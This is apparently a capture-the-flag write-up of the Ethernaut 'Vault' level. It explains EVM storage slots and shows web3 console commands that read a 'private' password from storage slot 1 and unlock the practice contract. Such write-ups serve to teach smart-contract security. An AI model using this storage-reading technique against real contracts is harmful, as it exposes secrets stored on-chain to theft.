<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

Challange's message.

>Unlock the vault to pass the level!

We have an contract which has type of bool variable called **locked** and type of **bytes** variable named **_password_** that defined in constructor(). What is more, there is **unlock()** function which checks _password we entered. If we entered correct password, unlocked will be **false** so we will beat this level.

## Smart Contract's Storage

Each smart contract running in the Ethereum Virtual Machine (EVM) maintains state in its own permanent storage. This storage can be thought of as a very large array, initially full of zeros. Each value in the array is 32-bytes wide, and there are 2256 such values. A smart contract can read from or write to a value at any location. That’s the extent of the storage interface.

<p align="center"><img  height="200" src="https://programtheblockchain.com/storage/storage.png"></p>

For example, we have a basic contract called **StorageTest** which helps us to understand how smart contract's storage works.


```solidity
contract StorageTest {
    uint256 a;
    bytes32 b;
}
```

In the above code:
+ ```a``` is stored at **slot 0**. 
+ ```b``` is stored at **slot 1**.

<p align="center"><img height="300" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Vault/img/storage.png"></p>

More about  [Smart Contract's Storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)

## Accessing Private Variabes In Contract's Storage

In solidity, unlike the general idea that someone can't access any private variable from external calls, we can access private variables from contract's storage because of the **_contract's storage open to external calls_**. In this senario, some libraries help us like **_web3_** to attain storage of contracts in blockchain. More about [Accessing Contract's Storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)

When you access storage of a contract with web3 library, you should use like this ```web.eth.getStorageAt(contract address,slot index)``` . More about [getStorageAt()](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#getstorageat)

# Subverting

Check situation of locked variable.

```js
await contract.locked()
true
```
Access **password** from our target contract's storage and appoint to pass variable.

```js
var pass = await web3.eth.getStorageAt(contract.address,1,console.log)
```
The pass variable is in hex type. Let's convert it to Utf8 which is readable format.
```js
await web3.utils.hexToUtf8(pass)
'A very strong secret password :)'
```
Call unlock function and enter pass as password.
```js
await contract.unlock(pass)
```
Check situation of locked variable again. And, we locked the vault!
```js
await contract.locked()
false
```

**_by wasny0ps_**
